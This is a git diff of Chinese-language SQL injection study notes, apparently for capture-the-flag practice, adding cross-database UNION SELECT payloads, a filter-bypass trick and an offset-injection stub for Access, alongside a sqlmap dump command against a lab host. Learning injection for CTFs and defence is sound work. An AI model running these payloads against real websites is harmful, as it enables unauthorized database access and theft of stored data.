@@ -52,9 +52,33 @@ union select 1,database(),group_concat(table_name)from information_schema.tables
 
    union：双写为ununionion
 
-   #### sqlite注入
+#### 跨库注入
 
-   [sqlite注入的一点总结 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/8627?u_atoken=100bccca0fa7b41dc93d4d361afe51c9&u_asig=1a0c39a017268046181531556e0035)
+1. 先找到指定的库的名字
+
+   ```sql
+   union select schema_name,2,3 from information_schema.schmata
+   ```
+
+   假设获取的是库名是admin114514
+
+2. 再同上利用范式获取表名即可 但是需要注意命令的差异
+
+   ```sql
+   union select 1,group_concat(table_name)from information_schema.tables where table_schema='admin114514'--+
+   ```
+
+3. 同上获取列名
+
+4. 获取指定数据
+
+   
+
+​	
+
+#### sqlite注入
+
+[sqlite注入的一点总结 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/8627?u_atoken=100bccca0fa7b41dc93d4d361afe51c9&u_asig=1a0c39a017268046181531556e0035)
 
 #### 布尔盲注
 
@@ -119,7 +143,7 @@ union select 1,database(),group_concat(table_name)from information_schema.tables
 
 #### 报错注入
 
-当网站开启错误调试信息时可用此方法注入（不然只能盲注）
+- **当网站开启错误调试信息时可用此方法注入（不然只能盲注）**
 
 假设一个网站传入为name = xxxx, pass = xxxx
 
@@ -135,5 +159,9 @@ python sqlmap.py -u "http://node4.anna.nssctf.cn:28366/?id=1" --dump
 
 
 
+#### 偏移注入
 
+- **在我们只能猜解出表名，而猜解不出我们所想要的字段名的情况下，直接爆最后的字段数据。**
+
+  适用于Microsoft Access数据库（没有`information_schema`数据库）
 
